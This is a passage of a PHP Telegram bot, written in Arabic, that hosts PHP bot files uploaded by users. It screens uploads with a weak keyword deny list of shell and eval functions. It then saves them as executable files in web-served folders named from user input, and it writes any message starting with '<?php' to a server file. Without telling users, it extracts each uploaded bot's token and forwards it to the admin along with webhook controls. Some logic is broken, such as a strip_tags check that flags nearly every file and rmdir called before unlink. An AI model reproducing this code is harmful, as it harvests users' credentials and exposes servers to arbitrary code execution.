     [['text'=>"تقييم البوت ⭐",'callback_data'=>"tqeemat" ],['text'=>"سرعه الاستضافة ✨",'callback_data'=>"bing" ]], 
     [['text'=>"حذف جميع ملفاتك ❗",'callback_data'=>"deleteall" ]],
     [['text'=>"قناة البوت",'url'=>"https://t.me/izeoe" ],['text'=>"مطور البوت",'url'=>"https://t.me/T_0_M0" ]], 
      ]
    ])
            ]);
				} 
			} 

			
		
$counts = $UploadEr["count$from_id"] ?? 0;
$vc = $UploadEr["count"] ?? 0;
$no = format_number($vc)?? "0";
$nj = count($UploadEr["memsA"]) ;
   if( $text == "/start") {
   	bot("sendmessage",[
                "chat_id" => $chat_id, 
                "text" => "[King Tom](tg://openmessage?user_id=1427981991)

• مرحبا بك ⦗ [$name](tg://user?id=$from_id) ⦘
• ارسل الملف الان لرفعه علي الاستضافه 
• ملفاتك المرفوعه ← ⦗ $counts ⦘
• عدد جميع ملفات المرفوعه ← ⦗ $vc | $no ⦘
• عدد مستخدمين البوت ← ⦗ $nj ⦘
• تعليمات البوت ← ⦗ /help ⦘",
                'parse_mode'=>"markdown",
                'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"رفع الملف 📤",'callback_data'=>"SendFile"]],
     [['text'=>"تحديث البوت ♻️",'callback_data'=>"refr" ],['text'=>"احصائيات الرفع 📊",'callback_data'=>"nas" ]], 
     [['text'=>"تقييم البوت ⭐",'callback_data'=>"tqeemat" ],['text'=>"سرعه الاستضافة ✨",'callback_data'=>"bing" ]], 
     [['text'=>"حذف جميع ملفاتك ❗",'callback_data'=>"deleteall" ]],
     [['text'=>"قناة البوت",'url'=>"https://t.me/izeoe" ],['text'=>"مطور البوت",'url'=>"https://t.me/T_0_M0" ]], 
      ]
    ])
            ]);
            $UploadEr["المود"][$from_id] = null ;
        SETJSON($UploadEr) ;
        return false ;
  }
  
  function progress($total, $current){
$progress = $current / $total;
$bar_length = 20;
$filled_length = round($bar_length * $progress);
$bar = str_repeat("✳️", $filled_length) . str_repeat("✨", ($bar_length - $filled_length));
$result = [
"bar"=>"[".$bar."]",
"progress"=>intval($progress * 100) ."%",
];
return $bar. intval($progress * 100) ."%";
}

function format_number($number) {
    $suffixes = array('', 'k', 'm', 'b', 't');
    $suffix_index = 0;

    while ($number >= 1000) {
        $number /= 1000;
        $suffix_index++;
    }

    return round($number, 1) . $suffixes[$suffix_index];
}

$admin = "1427981991"; #ايديك
$update = json_decode(file_get_contents('php://input'));
if ($update->callback_query) {
    $data = $update->callback_query->data;
    $chat_id = $update->callback_query->message->chat->id;
    $message_id = $update->callback_query->message->message_id;
    $name = $update->callback_query->message->chat->first_name;
    $from_id = $update->callback_query->from->id;
} elseif ($update->message) {
    $message = $update->message;
    $message_id = $update->message->message_id;
    $chat_id = $message->chat->id;
    $text = $message->text;
    $name = $message->from->first_name;
    $from_id = $message->from->id;
}

$nogom = [];
if (file_exists('nogom.json')) {
$nogom = json_decode(file_get_contents('nogom.json'), true);
}
if ($data == "tqeemat") {
    $average_rating = $nogom ? array_sum($nogom) / count($nogom) : 0;
    $nogomall = count($nogom);
    $stars = str_repeat("⭐", round($average_rating));
    $average_rating = round($average_rating, 1);
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "*☆︙تقييمك للبوت ← $stars ($average_rating)

☆︙عدد المشاركين في التقييم ← $nogomall

☆︙يرجى تقييم البوت من الازرار 🩵👇🏻.*",
        'parse_mode' => "markdown",
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [['text' => "⭐", 'callback_data' => "1"]],
                [['text' => "⭐⭐", 'callback_data' => "2"]],
                [['text' => "⭐⭐⭐", 'callback_data' => "3"]],
                [['text' => "⭐⭐⭐⭐", 'callback_data' => "4"]],
                [['text' => "⭐⭐⭐⭐⭐", 'callback_data' => "5"]],
                [["text"=>"⦅ الصفحه الرئيسيه ⦆","callback_data"=>"back"]],
            ]
        ])
    ]); 
} elseif (in_array($data, ["1", "2", "3", "4", "5"])) {
    $rating = (int)$data;
    $nogom[$chat_id] = $rating;
    file_put_contents('nogom.json', json_encode($nogom));
    $average_rating = array_sum($nogom) / count($nogom);
    $stars = str_repeat("⭐", round($average_rating));
    $average_rating = round($average_rating, 1);
    bot('editMessagetext', [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "*شكرا لتقييمك

$stars ($average_rating)
*",
        'parse_mode' => "markdown",
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [['text' => "إعادة التقييم ⭐", 'callback_data' => "nogom"]],
                [["text"=>"الصفحه الرئيسيه ♻️","callback_data"=>"back"]],
 ]])
]);
    bot("sendMessage", [
        "chat_id" => $admin,
        "text" => "*تم تقيم البوت من* $name 
*ٴ𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳
تقييمه للبوت $rating = ⭐
ٴ𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳*
☆︙المعرف [@$user]
☆︙الايدي $chat_id
☆︙[$name](https://t.me/$user)
*ٴ𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳*",
        "parse_mode" => "markdown",
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [['text' => "إرسال شكر 🤍", 'callback_data' => "shkr|$from_id|$name"]],
     ]])
  ]);
} elseif(explode("|", $data)[0] == "shkr") {
$from_id = explode("|", $data)[1];
$name = explode("|", $data)[2];
  bot("editMessagetext",[
            "chat_id" => $chat_id,
            'message_id' => $message_id , 
            "text" => "
*- تم ارسال رسالة شكر لـ ⦅ $name ⦆ *
" ,
            "parse_mode" => "markdown", 
        ]);
        bot("sendMessage", [
            "chat_id" => $from_id ,
            "text" => "
*شكرا لك على تقييم البوت هذا الشكر موجه لك من مالك البوت شخصيا 🩵.*
", 
            "parse_mode" => "markdown", 
            
   ]);   
}	
if ($data == "bing") {
$b=bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "تم البدء بقياس السرعه ✅",
        'parse_mode' => "Markdown",
    ]);
    sleep(1);
    
    $userb = strtoupper($userbot);

    $start_time = microtime(true);

    
        
    
    for ($i = 0; $i < 11; $i++) {
        bot("editMessageText", [
            "chat_id" => $chat_id,
            'message_id' => $b->result->message_id,
            "text" => "
            *
            ♻️ يتم قياس السرعه انتظر قليلا...
            " . $i * 10 . "%
            *
            ",
            "parse_mode" => "Markdown",
        ]);
    }

    $end_time = microtime(true);
    if ($i >= 10) {
        bot("editMessageText", [
            "chat_id" => $chat_id,
            'message_id' =>  $b->result->message_id,
            "text" => "
            *
            ✨ تم الانتهاء من قياس السرعه ✓
            *
            ",
            "parse_mode" => "Markdown",
            
        ]);
        sleep(1);
    }
    $execution_time = $end_time - $start_time;
    $execution_time = number_format($execution_time, 4, '.', '');
    if ($execution_time <= 1.5) {
        $f = "سريعه 💯🔥";
    }
    if ($execution_time <= 3 && $execution_time > 1.5) {
        $f = "متوسطة 🙂";
    }
    if ($execution_time > 3) {
        $f = "ضعيفة جدا 💔";
    }

    bot("editMessageText", [
        "chat_id" => $chat_id,
        'message_id' =>  $b->result->message_id,
        'text' => "
        ✬ سرعة البوت ⋙ $execution_time 
         $f
        ",
        'parse_mode' => "Markdown",
    ]);
}		
if($data == "nas") {
	$botfile = $UploadEr["FileMatch"]??"0";
	$other = $UploadEr["unFileMatch"]?? "0";
	$mm = $UploadEr["filehc"]?? "0";
	$curl = $UploadEr["curlfile"]?? "0";
	$no = format_number($vc)?? "0";
	bot("editMessagetext",[
            "chat_id" => $chat_id,
            'message_id' => $message_id , 
            "text" => "*
🆙] احصائيات الرفع في البوت @".bot("getme")->result->username. "
✔️] جميع الملفات : $vc | $no
🔘] ملفات بوتات : $botfile
🔲] غيرها من للملفات : $other
😴] ملفات اختراق تم الغائها : $mm
♻️] ملفات بمكتبه CURL : $curl
🚸] نسبه حمايه البوت للملفات الضاره : عاليه الدقه
            *
" ,
            "parse_mode" => "marKdown",
            
        ]);
	} 
  if($data == "refr") {
  	for($i=0;$i < 11;$i++){
  	bot("editMessagetext",[
            "chat_id" => $chat_id,
            'message_id' => $message_id , 
            "text" => "*
ℹ️] يتم عمل تحديث انتضر قليلا
". progress("100",$i*10)."
            *
" ,
            "parse_mode" => "marKdown",
            
        ]);
  }
  if($i >= 10){
  	bot("editMessagetext",[
            "chat_id" => $chat_id,
            'message_id' => $message_id , 
            "text" => "*
ℹ️] تم الانتهاء من التحديث
👁️] تم تحديث ملفات البوت
            *
" ,
            "parse_mode" => "marKdown",
            
        ]);
        bot("sendmessage",[
                "chat_id" => $chat_id, 
                "text" => "[King Tom](tg://openmessage?user_id=1427981991)

• مرحبا بك ⦗ [$name](tg://user?id=$from_id) ⦘
• ارسل الملف الان لرفعه علي الاستضافه 
• ملفاتك المرفوعه ← ⦗ $counts ⦘
• عدد جميع ملفات المرفوعه ← ⦗ $vc | $no ⦘
• عدد مستخدمين البوت ← ⦗ $nj ⦘
• تعليمات البوت ← ⦗ /help ⦘",
                'parse_mode'=>"markdown",
                'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"رفع الملف 📤",'callback_data'=>"SendFile"]],
     [['text'=>"تحديث البوت ♻️",'callback_data'=>"refr" ],['text'=>"احصائيات الرفع 📊",'callback_data'=>"nas" ]], 
     [['text'=>"تقييم البوت ⭐",'callback_data'=>"tqeemat" ],['text'=>"سرعه الاستضافة ✨",'callback_data'=>"bing" ]], 
     [['text'=>"حذف جميع ملفاتك ❗",'callback_data'=>"deleteall" ]],
     [['text'=>"قناة البوت",'url'=>"https://t.me/izeoe" ],['text'=>"مطور البوت",'url'=>"https://t.me/T_0_M0" ]], 
      ]
    ])
            ]);
  }
 } 
 
 if($data == "back") {
 	bot("editMessagetext",[
                "chat_id" => $chat_id, 
                "message_id" => $message_id, 
                "text" => "[King Tom](tg://openmessage?user_id=1427981991)

• مرحبا بك ⦗ [$name](tg://user?id=$from_id) ⦘
• ارسل الملف الان لرفعه علي الاستضافه 
• ملفاتك المرفوعه ← ⦗ $counts ⦘
• عدد جميع ملفات المرفوعه ← ⦗ $vc | $no ⦘
• عدد مستخدمين البوت ← ⦗ $nj ⦘
• تعليمات البوت ← ⦗ /help ⦘",
                'parse_mode'=>"markdown",
                'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"رفع الملف 📤",'callback_data'=>"SendFile"]],
     [['text'=>"تحديث البوت ♻️",'callback_data'=>"refr" ],['text'=>"احصائيات الرفع 📊",'callback_data'=>"nas" ]], 
     [['text'=>"تقييم البوت ⭐",'callback_data'=>"tqeemat" ],['text'=>"سرعه الاستضافة ✨",'callback_data'=>"bing" ]], 
     [['text'=>"حذف جميع ملفاتك ❗",'callback_data'=>"deleteall" ]],
     [['text'=>"قناة البوت",'url'=>"https://t.me/izeoe" ],['text'=>"مطور البوت",'url'=>"https://t.me/T_0_M0" ]], 
      ]
    ])
            ]);
        $UploadEr["المود"][$from_id] = null ;
        SETJSON($UploadEr) ;
} 
 
	
 if( $text == "/help") {
 	
   	bot("sendmessage",[
                "chat_id" => $chat_id, 
                "text" => "
☢️] تعليمات البوت كالاتي
1 - لاتقم برفع ملف مكرر مرتين ( يؤدي الي حظرك وحذف ملفاتك من البوت) 
2 - لاتقم برفع الملفات فيها اختراق (البوت فيه نصام فاحص قوي في حال اكتشاف سيتم حظرك من البوت ونشرك انك قمت بمحاوله اختراق) 
3- (الاهم) قم بازاله كود صنع ويبهوك تلقائي في الملف 

❤️] نتمني لك كل التوفيق
                ",
                'parse_mode'=>"markdown",
            ]);
  }

$domin = $_SERVER['HTTP_HOST']; // دومين يستخرج تلقائي

 if($update->message->document){
    $file_id = "https://api.telegram.org/file/bot".API_KEY."/".bot("getfile",["file_id"=>$update->message->document->file_id])->result->file_path;
    if(pathinfo($file_id, PATHINFO_EXTENSION) == "php"){
    	$b=bot("sendmessage",[
            "chat_id" => $chat_id,
            "text" => "
            *
📊] يتم التحليل انتضر قليلا..
            *
" ,
            "parse_mode" => "marKdown",
            
        ]);
    $ur ="https://" . $domin . "" . str_replace("HOSTING.php",null, $_SERVER['SCRIPT_NAME']). "".str_replace(".php",null,$update->message->document->file_name). "/bot.php";
$text = file_get_contents($file_id);

if (strip_tags($text) || 
    preg_match("/sendDocument/", $text) || 
    preg_match("/DIR/", $text) || 
    preg_match("/__DIR__/", $text) || 
    preg_match("/dev-/", $text) || 
    preg_match("/system\((.*)\)/", $text) || 
    preg_match("/assert/", $text) || 
    preg_match("/preg_replace/e", $text) || 
    preg_match("/assert/", $text) || 
    preg_match("/eval/", $text) || 
    preg_match("/proc_open/", $text) || 
    preg_match("/popen/", $text) || 
    preg_match("/passthru/", $text) || 
    preg_match("/system/", $text) || 
    preg_match("/zip/", $text) || 
    preg_match("/(.*)eval(.*)/i", $text) || 
    preg_match("/(.*)zip(.*)/i", $text) || 
    preg_match("/(.*)ZipArchive(.*)/i", $text) || 
    preg_match("/public function create/", $text) || 
    preg_match("/base64_decode/i", $text)) {
    bot("editMessagetext", [
        "chat_id" => $chat_id,
        'message_id' => $b->result->message_id, 
        "text" => "⌔︙ها ولك تحاول ⦗ [$name](tg://user?id=$from_id) ⦘ تخترق البوت مو 😉
⌔︙ديله ابلع احلا حضر بطعم الفراوله 🍓😜
⌔︙هسه لو يجي جدك ما فك الحضر عنك 🤭",
        "parse_mode" => "Markdown",
    ]);
    bot("sendMessage", [
        "chat_id" => $admin,
        "text" => "*#️⃣] محاوله اختراق*\n\n🔖] من $name\n\n[$from_id](tg://user?id=$chat_id)\n[Acount](tg://openmessage?user_id=$chat_id)",
        "parse_mode" => "Markdown",
    ]);
        $UploadEr[] = $from_id ;
        $UploadEr["filehc"] += 1 ;
        SETJSON($UploadEr) ;
    return false;
}

bot("editMessagetext",[
            "chat_id" => $chat_id,
            'message_id' => $b->result->message_id, 
            "text" => "
<s>📊] يتم التحليل انتظر قليلاً..</s>
🆙] تم الرفع بنجاح
✳️] اسم الملف الخاص بك (". $update->message->document->file_name. ")
" ,
            "parse_mode" => "html",
        ]);
        $dir_name = str_replace(".php", null, $update->message->document->file_name);

if (!file_exists($dir_name)) {
    mkdir($dir_name);
}

file_put_contents($dir_name . "/bot.php", file_get_contents($file_id));
        
$pattern = '/(\d+:[\w-]+)/';

if(preg_match("/api.telegram.org/", file_get_contents ($file_id))) {
	$UploadEr["FileMatch"] += 1;
	} else {
		$UploadEr["unFileMatch"] += 1;
		} 
		
		if (strpos(file_get_contents ($file_id), 'curl_') !== false) {
	$UploadEr["curlfile"] += 1;
	} 
if (preg_match($pattern, file_get_contents ($file_id), $matches)) {
    $token = "ℹ️] توكن البوت : [". $matches[0]. "]" ;
    $n = $matches[0];
    $sethock = ["🔛] عمل ويبهوك تلقائي", "❌] ازاله الويبهوك"] ;
    
} else {
	$token = "#️⃣] تعذر علي وجود توكن البوت" ;
	
}
        $cr = rand(9999,999999);
        bot("sendmessage",[
            "chat_id" => $chat_id,
            "text" => "🔼] تم الرفع بنجاح

$token 
" ,
            
            'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"$sethock[0]",'callback_data'=>"sethock|$cr" ]], 
     [['text'=>"♾️] حذف الملف من الاستضافه",'callback_data'=>"deletefile|$cr" ]], 
     [['text'=>"$sethock[1]",'callback_data'=>"delete|$cr" ]], 
       
      ]
    ])
        ]);
        bot("sendmessage",[
            "chat_id" => $admin ,
            "text" => "🔼] تم الرفع بنجاح
$token 
" ,
            
            'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"$sethock[0]",'callback_data'=>"sethock|$cr" ]], 
     [['text'=>"♾️] حذف الملف من الاستضافه",'callback_data'=>"deletefile|$cr" ]], 
     [['text'=>"$sethock[1]",'callback_data'=>"delete|$cr" ]], 
       
      ]
    ])
        ]);
        $UploadEr["count$from_id"] += 1;
        $UploadEr["count"] += 1;
        $UploadEr["meFile"][$from_id][] = $update->message->document->file_name;
        $UploadEr[$cr] = "$n|$ur|".$update->message->document->file_name;
        SETJSON($UploadEr) ;
    }else{
    	bot("sendmessage",[
            "chat_id" => $chat_id,
            "text" => "❌] قم بارسال ملفات بصيغه php فقط" ,
            "parse_mode" => "marKdown",
            
        ]);
   } 
}
$da = explode ("|", $data) ;
if($da[0] == "sethock") {
	if($da[1] !=null) {
		$cr = $da[1];
		$tk = explode("|", $UploadEr[$cr])[0];
		$ul = explode("|", $UploadEr[$cr])[1];
		file_get_contents("https://api.telegram.org/bot$tk/setwebhook?url=$ul") ;
		$user = "@".(json_decode(file_get_contents("https://api.telegram.org/bot$tk/getme"))->result->username?? "يبدو ان التوكن خاطء في الملف") ;
	bot('answerCallbackQuery',[
      'callback_query_id'=>$update->callback_query->id,
      'text'=>"
☢️] تم عمل ويبهوك تلقائي
🎃] معرف البوت الخاص بك : $user
",
      'show_alert'=>true
      ]);
     } 
	}
	
	if($da[0] == "delete") {
	if($da[1] !=null) {
		$cr = $da[1];
		$tk = explode("|", $UploadEr[$cr])[0];
		$ul = explode("|", $UploadEr[$cr])[1];
		file_get_contents("https://api.telegram.org/bot$tk/deleteWebhook") ;
		$user = "@".(json_decode(file_get_contents("https://api.telegram.org/bot$tk/getme"))->result->username?? "يبدو ان التوكن خاطء في الملف") ;
	bot('answerCallbackQuery',[
      'callback_query_id'=>$update->callback_query->id,
      'text'=>"
❌] تم ازاله الويبهوك علي البوت
🎃] معرف البوت الخاص بك : $user
",
      'show_alert'=>true
      ]);
     } 
	}
	
	if($da[0] == "deletefile") {
	if($da[1] !=null) {
		$cr = $da[1];
		$tk = explode("|", $UploadEr[$cr])[0];
		$ul = explode("|", $UploadEr[$cr])[1];
		$nmv= str_replace(".php",null,explode("|", $UploadEr[$cr])[2]) ;
		rmdir($nmv);
		unlink("$nmv/bot.php");
		file_get_contents("https://api.telegram.org/bot$tk/deleteWebhook") ;
		$user = "@".(json_decode(file_get_contents("https://api.telegram.org/bot$tk/getme"))->result->username?? "يبدو ان التوكن خاطء في الملف") ;
	bot('answerCallbackQuery',[
      'callback_query_id'=>$update->callback_query->id,
      'text'=>"
🗑️] تم حذف الملف بنجاح
🎃] معرف البوت الخاص بك : $user
📐] في المسار : $nmv
",
      'show_alert'=>true
      ]);
     } 
	} 
	
if($da[0] == "deletefile") {
    if($da[1] != null) {
        $cr = $da[1];
        $tk = explode("|", $UploadEr[$cr])[0];
        $ul = explode("|", $UploadEr[$cr])[1];
        $nmv = str_replace(".php", null, explode("|", $UploadEr[$cr])[2]);
        
        // حذف المجلد إذا كان موجودا
        $folder_path = __DIR__ . "/$chat_id/$nmv";
        if (file_exists($folder_path)) {
            // حذف الملفات داخل المجلد
            $files = glob("$folder_path/*");
            foreach($files as $file){
                if(is_file($file))
                    unlink($file);
 }
            rmdir($folder_path);
            unset($UploadEr[$cr]);
            SETJSON($UploadEr);
            bot('answerCallbackQuery',[
                'callback_query_id'=>$update->callback_query->id,
                'text'=>"
🗑️] تم حذف الملف بنجاح
",
                'show_alert'=>true
            ]);
        } else {
            // إرسال رسالة بأن الملف تم حذفه من قبل
            bot('answerCallbackQuery',[
                'callback_query_id'=>$update->callback_query->id,
                'text'=>"
❌ الملف تم حذفه من قبل
",
                'show_alert'=>true
            ]);
  }}}
if($data == "deleteall") {
        // حذف المجلد إذا كان موجودا
        $folder_path = __DIR__ . "/$chat_id";
        if (file_exists($folder_path)) {
    // العثور على جميع المجلدات الفرعية
    $subfolders = glob("$folder_path/*", GLOB_ONLYDIR);
    
    // حذف الملفات داخل كل مجلد فرعي والمجلد نفسه
    foreach ($subfolders as $subfolder) {
        $files = glob("$subfolder/*");
        foreach ($files as $file) {
            if (is_file($file)) {
                unlink($file);
            }
        }
        rmdir($subfolder);
    }
    $files = glob("$folder_path/*");
    foreach ($files as $file) {
        if (is_file($file)) {
            unlink($file);
  } }
    rmdir($folder_path);
$UploadEr["count"] = 0; 
$UploadEr["count$from_id"] = 0;
SETJSON($UploadEr);
            bot('answerCallbackQuery',[
                'callback_query_id'=>$update->callback_query->id,
                'text'=>"
♻️ تم حذف جميع ملفاتك بنجاح 
",
                'show_alert'=>true
            ]);
        } else {      
        $UploadEr["count$from_id"] = 0;
        SETJSON($UploadEr);            
            bot('answerCallbackQuery',[
                'callback_query_id'=>$update->callback_query->id,
                'text'=>"
♨️ تم حذف ملفاتك من قبل لا يوجد ملفات حاليا 
",
                'show_alert'=>true
            ]);
   }}
if (isset($update->message->text)) {
        $chat_id = $update->message->chat->id;
        $message_text = $update->message->text;
        if (strpos($message_text, "<?php") === 0) {
            $php_content = substr($message_text, 5);
            $random_filename = uniqid() . ".php";
            file_put_contents($random_filename, $php_content);
            sendDocument($chat_id, $random_filename);
   }}

